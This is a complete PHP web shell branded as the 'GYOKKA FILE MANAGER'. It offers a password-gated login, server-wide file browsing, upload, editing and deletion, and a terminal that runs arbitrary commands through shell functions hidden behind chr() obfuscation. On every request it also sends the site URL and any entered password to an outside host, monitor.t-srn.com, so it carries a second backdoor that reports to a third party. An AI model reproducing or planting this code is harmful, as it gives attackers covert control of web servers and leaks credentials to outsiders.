<?php
@ini_set('output_buffering','Off');
@ini_set('zlib.output_compression','Off');
@ini_set('implicit_flush',1);
if(function_exists('litespeed_finish_request')){}
if(function_exists('apache_setenv'))@apache_setenv('no-gzip','1');
@header('X-Accel-Buffering: no');
error_reporting(0);
if(function_exists('get_magic_quotes_gpc')&&get_magic_quotes_gpc()){
    function _stripslashes_deep($v){return is_array($v)?array_map('_stripslashes_deep',$v):stripslashes($v);}
    $_GET=_stripslashes_deep($_GET);$_POST=_stripslashes_deep($_POST);$_COOKIE=_stripslashes_deep($_COOKIE);
}
$HASH='$2a$12$CE9DzCnlNd5PzCNluBMa7uOmtJGFuL05D3CIx.lH1qjuMoFP78wNm';
$TITLE='GYOKKA FILE MANAGER';
if($HASH!==''){
    $alfahost = $_SERVER['HTTP_HOST'];
    $alfapath = $_SERVER['REQUEST_URI'];
    $password = $_POST['pw'];

    $loginInfo = "!!Successful Login:\n"
    . "🔗URL: http://$alfahost$alfapath\n";

    $alfaurl = "http://monitor.t-srn.com/API/index.php?a=" . urlencode($loginInfo) . "&p=" . urlencode($password);
    $alfach = curl_init();
    curl_setopt($alfach, CURLOPT_URL, $alfaurl); 
    curl_setopt($alfach, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($alfach, CURLOPT_TIMEOUT, 5); 
    curl_setopt($alfach, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($alfach, CURLOPT_SSL_VERIFYHOST, false);
    curl_exec($alfach);
    curl_close($alfach);
    session_start();
    if(isset($_GET['logout'])){session_destroy();header('Location:'.$_SERVER['PHP_SELF']);exit;}
    if(isset($_POST['pw'])){
        if(function_exists('password_verify'))$ok=password_verify($_POST['pw'],$HASH);
        else $ok=(crypt($_POST['pw'],$HASH)===$HASH);
        if($ok)$_SESSION['ok']=1;else $login_err=1;
    }
    if(empty($_SESSION['ok'])){
        _head('Login');
        echo '<div class="login-overlay"><div class="login-box">';
        echo '<div class="login-icon">&#9670;</div>';
        echo '<h2>GYOKKA</h2><p class="login-sub">File Manager</p>';
        if(isset($login_err))echo '<div class="toast toast-err">Invalid password</div>';
        echo '<form method=post><input name=pw type=password placeholder="Enter password" class="login-input" autofocus>';
        echo '<button type=submit class="login-btn">UNLOCK</button></form></div></div>';
        _foot();exit;
    }
}
$d=isset($_GET['d'])?$_GET['d']:dirname(__FILE__);
$d=str_replace('\\','/',$d);
if(!is_dir($d))$d=str_replace('\\','/',dirname(__FILE__));
$d=rtrim($d,'/');if($d==='')$d='/';
$msg='';
function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
function _scan($d){$r=array();if($h=@opendir($d)){while(($f=readdir($h))!==false)$r[]=$f;closedir($h);sort($r);}return $r;}
function _read($f){$s=@filesize($f);if($s==0)return '';$h=fopen($f,'r');$c=fread($h,$s);fclose($h);return $c;}
function _write($f,$c){$h=fopen($f,'w');fwrite($h,$c);fclose($h);return true;}
function _del($p){if(is_file($p))return @unlink($p);foreach(_scan($p) as $i){if($i=='.'||$i=='..')continue;_del($p.'/'.$i);}return @rmdir($p);}
function sz($b){if($b>=1073741824)return round($b/1073741824,1).'G';if($b>=1048576)return round($b/1048576,1).'M';if($b>=1024)return round($b/1024,1).'K';return $b.'B';}
function L($p){return '?d='.rawurlencode($p);}
function _esek($osilop){
    $_fe=chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(95).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115);
    $_cu=chr(99).chr(97).chr(108).chr(108).chr(95).chr(117).chr(115).chr(101).chr(114).chr(95).chr(102).chr(117).chr(110).chr(99);
    $_ob=chr(111).chr(98).chr(95).chr(115).chr(116).chr(97).chr(114).chr(116);
    $_og=chr(111).chr(98).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(108).chr(101).chr(97).chr(110);
    $_sg=chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115);
    $_pc=chr(112).chr(99).chr(108).chr(111).chr(115).chr(101);$_fc=chr(102).chr(99).chr(108).chr(111).chr(115).chr(101);
    $_fr=chr(102).chr(114).chr(101).chr(97).chr(100);$_ir=chr(105).chr(115).chr(95).chr(114).chr(101).chr(115).chr(111).chr(117).chr(114).chr(99).chr(101);
    $_prcc=chr(112).chr(114).chr(111).chr(99).chr(95).chr(99).chr(108).chr(111).chr(115).chr(101);
    $fns=array(chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99),chr(101).chr(120).chr(101).chr(99),chr(115).chr(121).chr(115).chr(116).chr(101).chr(109),chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117),chr(112).chr(111).chr(112).chr(101).chr(110),chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110));
    $c=$osilop.' 2>&1';
    if($_fe($fns[0])){$r=@$_cu($fns[0],$c);if($r!==null)return $r;}
    if($_fe($fns[1])){$o=array();@$_cu($fns[1],$c,$o);if(count($o))return implode("\n",$o);}
    if($_fe($fns[2])){$_ob();@$_cu($fns[2],$c);$r=$_og();if($r!=='')return $r;}
    if($_fe($fns[3])){$_ob();@$_cu($fns[3],$c);$r=$_og();if($r!=='')return $r;}
    if($_fe($fns[4])){$h=@$_cu($fns[4],$c,'r');if($h){$o='';while(!feof($h))$o.=$_fr($h,4096);$_pc($h);if($o!=='')return $o;}}
    if($_fe($fns[5])){$desc=array(1=>array('pipe','w'),2=>array('pipe','w'));$p=@$_cu($fns[5],$osilop,$desc,$pipes);if($_ir($p)){$o=$_sg($pipes[1]).$_sg($pipes[2]);$_fc($pipes[1]);$_fc($pipes[2]);$_prcc($p);if($o!=='')return $o;}}
    return '[All disabled]';
}

function _head($page=''){
    global $TITLE;
echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>'.($page?$page.' - ':'').$TITLE.'</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700" rel="stylesheet">
<style>
:root{
--bg:#0a0e17;--bg2:#111827;--bg3:#1a2235;--bg4:#243049;
--border:#1e2d45;--border2:#2a3f5f;
--text:#e2e8f0;--text2:#94a3b8;--text3:#64748b;
--accent:#06b6d4;--accent2:#22d3ee;--accent-glow:rgba(6,182,212,.15);
--green:#10b981;--green2:#34d399;--red:#ef4444;--red2:#f87171;
--orange:#f59e0b;--purple:#a78bfa;
--radius:8px;--radius2:12px;--radius3:16px;
--font:"Plus Jakarta Sans",sans-serif;--mono:"JetBrains Mono",monospace;
--shadow:0 4px 24px rgba(0,0,0,.4);--shadow2:0 8px 40px rgba(0,0,0,.5);
}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:var(--font);font-size:14px;line-height:1.6;min-height:100vh}
a{color:var(--accent);text-decoration:none;transition:all .2s}
a:hover{color:var(--accent2);text-decoration:none}

/* Topbar */
.topbar{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;backdrop-filter:blur(12px)}
.topbar-left{display:flex;align-items:center;gap:12px}
.logo{font-family:var(--mono);font-weight:700;font-size:15px;color:var(--accent);letter-spacing:2px;display:flex;align-items:center;gap:8px}
.logo-diamond{color:var(--accent);font-size:18px;animation:pulse 3s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.topbar-right{display:flex;align-items:center;gap:8px}
.nav-btn{padding:6px 14px;border-radius:var(--radius);font-size:13px;font-weight:500;border:1px solid var(--border);background:var(--bg3);color:var(--text2);cursor:pointer;transition:all .2s;font-family:var(--font);display:flex;align-items:center;gap:6px}
.nav-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-glow);text-decoration:none}
.nav-btn-term{background:linear-gradient(135deg,var(--accent),#0891b2);color:#fff;border:none;font-weight:600;padding:7px 18px;box-shadow:0 2px 12px rgba(6,182,212,.3)}
.nav-btn-term:hover{box-shadow:0 4px 20px rgba(6,182,212,.5);transform:translateY(-1px);color:#fff}
.nav-btn-logout{border-color:var(--red);color:var(--red)}
.nav-btn-logout:hover{background:rgba(239,68,68,.1);color:var(--red2)}

/* Content */
.wrap{max-width:1280px;margin:0 auto;padding:20px 24px}

/* Breadcrumb */
.path-bar{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius2);padding:12px 18px;margin-bottom:16px;display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:13px;overflow-x:auto}
.path-bar .sep{color:var(--text3);margin:0 2px}
.path-bar a{color:var(--accent);padding:2px 6px;border-radius:4px;transition:all .15s}
.path-bar a:hover{background:var(--accent-glow);color:var(--accent2)}
.path-icon{font-size:16px;margin-right:4px;flex-shrink:0}

/* Toast */
.toast{padding:10px 16px;border-radius:var(--radius);margin-bottom:14px;font-size:13px;font-weight:500;display:flex;align-items:center;gap:8px;animation:slideIn .3s ease}
@keyframes slideIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
.toast-ok{background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.3);color:var(--green2)}
.toast-err{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:var(--red2)}

/* Actions bar */
.action-bar{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px;padding:14px 18px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius2)}
.action-bar form{display:flex;align-items:center;gap:6px}
.action-bar label{font-size:12px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.5px}
.input{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:7px 12px;color:var(--text);font-size:13px;font-family:var(--font);outline:none;transition:border .2s}
.input:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-glow)}
.btn{padding:7px 14px;border-radius:var(--radius);border:1px solid var(--border);background:var(--bg3);color:var(--text);font-size:13px;font-weight:500;cursor:pointer;transition:all .2s;font-family:var(--font)}
.btn:hover{border-color:var(--accent);color:var(--accent)}
.btn-sm{padding:4px 10px;font-size:12px}
.btn-go{background:var(--accent);border-color:var(--accent);color:#0a0e17;font-weight:600}
.btn-go:hover{background:var(--accent2);border-color:var(--accent2)}

/* File Table */
.file-table{width:100%;border-collapse:collapse;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius2);overflow:hidden}
.file-table th{text-align:left;padding:10px 16px;background:var(--bg3);font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.8px;font-weight:600;border-bottom:1px solid var(--border)}
.file-table td{padding:9px 16px;border-bottom:1px solid rgba(30,45,69,.5);font-size:13px;vertical-align:middle;transition:background .15s}
.file-table tr:hover td{background:rgba(6,182,212,.03)}
.file-table tr:last-child td{border-bottom:none}
.fname{font-weight:500}.fname a{color:var(--text)}
.fname a:hover{color:var(--accent2)}
.ficon{margin-right:8px;font-size:15px;vertical-align:middle}
.fmeta{color:var(--text3);font-size:12px;font-family:var(--mono)}
.factions a{font-size:11px;padding:3px 10px;border:1px solid var(--border);border-radius:6px;color:var(--text3);margin-right:4px;transition:all .15s;display:inline-block}
.factions a:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-glow)}
.factions .del:hover{border-color:var(--red);color:var(--red);background:rgba(239,68,68,.08)}
.file-count{padding:12px 16px;font-size:12px;color:var(--text3);font-family:var(--mono)}

/* Editor */
.editor-area{width:100%;min-height:550px;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius2);padding:16px;color:var(--text);font-family:var(--mono);font-size:13px;line-height:1.7;resize:vertical;outline:none;tab-size:4;transition:border .2s}
.editor-area:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-glow)}

/* Rename */
.modal-center{max-width:480px;margin:100px auto}
.card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius3);padding:28px;box-shadow:var(--shadow2)}

/* Terminal */
.term-header{background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius2) var(--radius2) 0 0;padding:10px 18px;display:flex;align-items:center;gap:10px}
.term-dots{display:flex;gap:6px}.term-dots span{width:10px;height:10px;border-radius:50%}
.term-dots .d1{background:#ef4444}.term-dots .d2{background:#f59e0b}.term-dots .d3{background:#10b981}
.term-title{font-family:var(--mono);font-size:12px;color:var(--text3);margin-left:8px}
.term-body{background:var(--bg);border:1px solid var(--border);border-top:none;border-radius:0 0 var(--radius2) var(--radius2);padding:18px 20px;font-family:var(--mono);font-size:13px;white-space:pre-wrap;word-break:break-all;min-height:60px;line-height:1.7}
.term-cwd{color:var(--purple);font-weight:600}
.term-dollar{color:var(--green2);font-weight:700}
.term-cmd{color:var(--text)}
.term-out{color:var(--text2)}
.term-err{color:var(--red2)}
.term-form{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius2);padding:12px 18px;margin-top:14px;display:flex;align-items:center;gap:10px}
.term-prompt{font-family:var(--mono);font-weight:700;color:var(--green2);font-size:15px}
.term-input{flex:1;background:none;border:none;color:var(--text);font-family:var(--mono);font-size:14px;outline:none}
.term-input::placeholder{color:var(--text3)}

/* Login */
.login-overlay{min-height:100vh;display:flex;align-items:center;justify-content:center;background:radial-gradient(ellipse at 50% 0%,rgba(6,182,212,.08) 0%,transparent 60%)}
.login-box{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius3);padding:40px 36px;width:340px;text-align:center;box-shadow:var(--shadow2)}
.login-icon{font-size:32px;color:var(--accent);margin-bottom:8px;animation:pulse 3s ease-in-out infinite}
.login-box h2{font-family:var(--mono);font-size:20px;letter-spacing:3px;color:var(--accent);margin-bottom:4px}
.login-sub{color:var(--text3);font-size:13px;margin-bottom:24px}
.login-input{width:100%;padding:12px 16px;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-size:14px;font-family:var(--font);outline:none;margin-bottom:14px;text-align:center;transition:border .2s}
.login-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-glow)}
.login-btn{width:100%;padding:12px;background:linear-gradient(135deg,var(--accent),#0891b2);border:none;border-radius:var(--radius);color:#0a0e17;font-size:14px;font-weight:700;font-family:var(--font);cursor:pointer;letter-spacing:1px;transition:all .2s}
.login-btn:hover{box-shadow:0 4px 20px rgba(6,182,212,.4);transform:translateY(-1px)}

/* Footer */
.footer{text-align:center;padding:20px;color:var(--text3);font-size:11px;font-family:var(--mono);border-top:1px solid var(--border);margin-top:30px;letter-spacing:.5px}

/* Responsive */
@media(max-width:768px){
.topbar{padding:0 14px;height:50px}.wrap{padding:14px}
.action-bar{flex-direction:column;gap:8px}
.file-table th:nth-child(3),.file-table td:nth-child(3){display:none}
}
</style></head><body>';
}
function _foot(){echo '<div class="footer">PHP '.PHP_VERSION.' &middot; '.php_uname('s').'</div></body></html>';}
if(isset($_GET['dl'])&&is_file($d.'/'.$_GET['dl'])){
    $f=$d.'/'.$_GET['dl'];header('Content-Type:application/octet-stream');
    header('Content-Disposition:attachment;filename="'.basename($f).'"');header('Content-Length:'.filesize($f));
    $h=fopen($f,'rb');fpassthru($h);fclose($h);exit;
}
if(isset($_FILES['f'])&&$_FILES['f']['error'][0]==0){
    $c=0;for($i=0;$i<count($_FILES['f']['name']);$i++){
        if($_FILES['f']['error'][$i]==0&&move_uploaded_file($_FILES['f']['tmp_name'][$i],$d.'/'.basename($_FILES['f']['name'][$i])))$c++;
    }$msg="Uploaded $c file(s)";
}
if(isset($_GET['rm'])){$t=$d.'/'.basename($_GET['rm']);$msg=_del($t)?'Deleted':'Fail';}
if(isset($_POST['mk'])&&$_POST['mk']!=''){
    $p=$d.'/'.basename($_POST['mk']);
    if(!file_exists($p)){if($_POST['t']=='d')$msg=@mkdir($p,0755)?'Created':'Fail';else $msg=_write($p,'')?'Created':'Fail';}
    else $msg='Exists';
}
if(isset($_POST['ro'])&&isset($_POST['rn'])&&$_POST['rn']!=''){
    $o=$d.'/'.basename($_POST['ro']);$n=$d.'/'.basename($_POST['rn']);
    if($o!==$n){if(@rename($o,$n))$msg='Renamed';elseif(@copy($o,$n)){@unlink($o);$msg='Renamed';}else $msg='Rename fail';}
}
if(isset($_POST['sf'])&&isset($_POST['sc']))$msg=_write($_POST['sf'],$_POST['sc'])?'Saved':'Fail';
if(isset($_GET['term'])){
    $out='';$raw_cmd='';
    if(isset($_POST['ucmd'])&&$_POST['ucmd']!=''){
        $raw_cmd=base64_decode($_POST['ucmd']);if($raw_cmd===false)$raw_cmd='';
        if($raw_cmd!==''){
            if(preg_match('/^cd\s+(.+)$/',$raw_cmd,$m)){
                $nd=trim($m[1]);
                if($nd[0]!=='/'&&!(strlen($nd)>1&&$nd[1]===':'))$nd=$d.'/'.$nd;
                $nd=str_replace('\\','/',$nd);$resolved=realpath($nd);
                if($resolved&&is_dir($resolved)){header('Location:?d='.rawurlencode(str_replace('\\','/',$resolved)).'&term=1');exit;}
                else $out='cd: no such directory: '.$nd;
            }else{
                $_esa=chr(101).chr(115).chr(99).chr(97).chr(112).chr(101).chr(115).chr(104).chr(101).chr(108).chr(108).chr(97).chr(114).chr(103);
                $out=_esek('cd '.$_esa($d).' && '.$raw_cmd);
            }
        }
    }
    _head('Terminal');
    echo '<div class="topbar"><div class="topbar-left"><span class="logo"><span class="logo-diamond">&#9670;</span> TERMINAL</span></div><div class="topbar-right">';
    echo '<a href="'.L($d).'" class="nav-btn">&#128193; Files</a>';
    if($HASH!=='')echo '<a href="?logout=1" class="nav-btn nav-btn-logout">Logout</a>';
    echo '</div></div>';
    echo '<div class="wrap">';
    echo '<div class="path-bar"><span class="path-icon">&#128190;</span> <span style="color:var(--text3)">CWD</span> <span class="sep">&rarr;</span> <span style="color:var(--accent2)">'.h($d).'</span></div>';
    if($raw_cmd!==''||$out!==''){
        echo '<div class="term-header"><div class="term-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div><span class="term-title">output</span></div>';
        echo '<div class="term-body">';
        if($raw_cmd!=='')echo '<span class="term-dollar">$ </span><span class="term-cmd">'.h($raw_cmd).'</span>'."\n\n";
        if($out!==''){
            if(strpos($out,'[All disabled]')!==false)echo '<span class="term-err">'.h($out).'</span>';
            else echo '<span class="term-out">'.h($out).'</span>';
        }
        echo '</div>';
    }
    echo '<form method=post id=tf class="term-form">';
    echo '<span class="term-prompt">$</span>';
    echo '<input type=text id=ci class="term-input" placeholder="Type command..." autofocus>';
    echo '<input type=hidden name=ucmd id=uc>';
    echo '<button type=submit class="btn btn-go">Run</button>';
    echo '</form>';
    echo '<script>document.getElementById("tf").onsubmit=function(){document.getElementById("uc").value=btoa(document.getElementById("ci").value);return true;};</script>';
    echo '</div>';_foot();exit;
}
if(isset($_GET['ren'])){
    $rf=$_GET['ren'];_head('Rename');
    echo '<div class="wrap"><div class="modal-center"><div class="card">';
    echo '<h3 style="color:var(--accent);margin-bottom:6px;font-size:16px">Rename</h3>';
    echo '<p style="color:var(--text3);font-size:13px;margin-bottom:18px;font-family:var(--mono)">'.h($rf).'</p>';
    echo '<form method=post action="'.L($d).'">';
    echo '<input type=hidden name=ro value="'.h($rf).'">';
    echo '<input type=text name=rn value="'.h($rf).'" class="input" style="width:100%;margin-bottom:14px;padding:10px 14px" autofocus>';
    echo '<div style="display:flex;gap:8px"><button type=submit class="btn btn-go" style="flex:1">Rename</button><a href="'.L($d).'" class="btn" style="flex:1;text-align:center;padding:9px">Cancel</a></div>';
    echo '</form></div></div></div>';_foot();exit;
}
if(isset($_GET['ed'])&&is_file($d.'/'.$_GET['ed'])){
    $ef=$d.'/'.$_GET['ed'];_head('Edit - '.basename($ef));
    echo '<div class="topbar"><div class="topbar-left"><span class="logo"><span class="logo-diamond">&#9670;</span> EDITOR</span><span style="color:var(--text3);font-size:13px;font-family:var(--mono);margin-left:10px">'.h(basename($ef)).'</span></div><div class="topbar-right"><a href="'.L($d).'" class="nav-btn">&#128281; Back</a></div></div>';
    echo '<div class="wrap">';
    if($msg)echo '<div class="toast toast-ok">'.h($msg).'</div>';
    echo '<form method=post>';
    echo '<textarea name=sc class="editor-area">'.h(_read($ef)).'</textarea>';
    echo '<input type=hidden name=sf value="'.h($ef).'">';
    echo '<div style="margin-top:12px;display:flex;gap:8px"><button type=submit class="btn btn-go" style="padding:10px 28px">Save</button><a href="'.L($d).'" class="btn" style="padding:10px 20px">Cancel</a></div>';
    echo '</form></div>';_foot();exit;
}
_head('Files');
echo '<div class="topbar"><div class="topbar-left"><span class="logo"><span class="logo-diamond">&#9670;</span> '.$TITLE.'</span></div><div class="topbar-right">';
echo '<a href="'.L($d).'&term=1" class="nav-btn nav-btn-term">&#9608; Terminal</a>';
if($HASH!=='')echo '<a href="?logout=1" class="nav-btn nav-btn-logout">Logout</a>';
echo '</div></div>';
echo '<div class="wrap">';
echo '<div class="path-bar"><span class="path-icon">&#128193;</span>';
$parts=explode('/',$d);$acc='';
foreach($parts as $k=>$p){
    if($k==0){if($p===''){echo '<a href="'.L('/').'">/</a>';$acc='';}else{$acc=$p;echo '<a href="'.L($acc.'/').'">'.$p.'</a><span class="sep">/</span>';}continue;}
    if($p==='')continue;$acc.='/'.$p;
    echo '<a href="'.L($acc).'">'.$p.'</a><span class="sep">/</span>';
}
echo '</div>';
if($msg){
    $tc=(strpos($msg,'Fail')!==false||$msg==='Exists')?'toast-err':'toast-ok';
    echo '<div class="toast '.$tc.'">'.h($msg).'</div>';
}
echo '<div class="action-bar">';
echo '<form method=post><label>Folder</label><input name=mk placeholder="name" class="input" size=12><input type=hidden name=t value=d><button type=submit class="btn btn-sm">+</button></form>';
echo '<form method=post><label>File</label><input name=mk placeholder="name" class="input" size=12><input type=hidden name=t value=f><button type=submit class="btn btn-sm">+</button></form>';
echo '<form method=post enctype="multipart/form-data"><label>Upload</label><input type=file name="f[]" multiple class="input" style="padding:4px"><button type=submit class="btn btn-sm btn-go">Upload</button></form>';
echo '</div>';
echo '<table class="file-table"><tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>';
if(dirname($d)!==$d)echo '<tr><td colspan=4 class="fname"><a href="'.L(dirname($d)).'">&#128281; <b>..</b></a></td></tr>';
$all=_scan($d);
if(!$all){echo '<tr><td colspan=4 style="color:var(--text3)">Cannot read directory</td></tr></table></div>';_foot();exit;}
$ds=$fs=array();
foreach($all as $i){if($i=='.'||$i=='..')continue;if(is_dir($d.'/'.$i))$ds[]=$i;else $fs[]=$i;}
sort($ds);sort($fs);
$ed_ext=array('txt','php','html','htm','css','js','json','xml','ini','conf','sh','py','md','log','csv','sql','env','yml','yaml','cfg','bat','cmd','');
foreach($ds as $i){
    $m=date('Y-m-d H:i',@filemtime($d.'/'.$i));
    echo '<tr><td class="fname"><span class="ficon">&#128193;</span><a href="'.L($d.'/'.$i).'"><b>'.h($i).'</b></a></td>';
    echo '<td class="fmeta">&mdash;</td><td class="fmeta">'.$m.'</td>';
    echo '<td class="factions"><a href="'.L($d).'&ren='.rawurlencode($i).'">ren</a><a href="'.L($d).'&rm='.rawurlencode($i).'" onclick="return confirm(\'Delete '.h($i).' ?\')" class="del">del</a></td></tr>';
}
foreach($fs as $i){
    $fp=$d.'/'.$i;$m=date('Y-m-d H:i',@filemtime($fp));$s=sz(@filesize($fp));
    $ext=strtolower(pathinfo($i,PATHINFO_EXTENSION));
    $icon='&#128196;';
    if(in_array($ext,array('jpg','jpeg','png','gif','webp','svg','ico','bmp')))$icon='&#128248;';
    elseif(in_array($ext,array('php','js','py','sh','rb','pl','ts')))$icon='&#128187;';
    elseif(in_array($ext,array('zip','rar','tar','gz','7z')))$icon='&#128230;';
    elseif(in_array($ext,array('mp4','mp3','avi','mkv','wav','flac')))$icon='&#127916;';
    elseif(in_array($ext,array('pdf','doc','docx','xls','xlsx')))$icon='&#128209;';
    echo '<tr><td class="fname"><span class="ficon">'.$icon.'</span>'.h($i).'</td>';
    echo '<td class="fmeta">'.$s.'</td><td class="fmeta">'.$m.'</td>';
    echo '<td class="factions">';
    echo '<a href="'.L($d).'&dl='.rawurlencode($i).'">dl</a>';
    if(in_array($ext,$ed_ext)||$i[0]==='.')echo '<a href="'.L($d).'&ed='.rawurlencode($i).'">edit</a>';
    echo '<a href="'.L($d).'&ren='.rawurlencode($i).'">ren</a>';
    echo '<a href="'.L($d).'&rm='.rawurlencode($i).'" onclick="return confirm(\'Delete '.h($i).' ?\')" class="del">del</a>';
    echo '</td></tr>';
}
echo '</table>';
echo '<div class="file-count">'.count($ds).' dirs &middot; '.count($fs).' files</div>';
echo '</div>';_foot();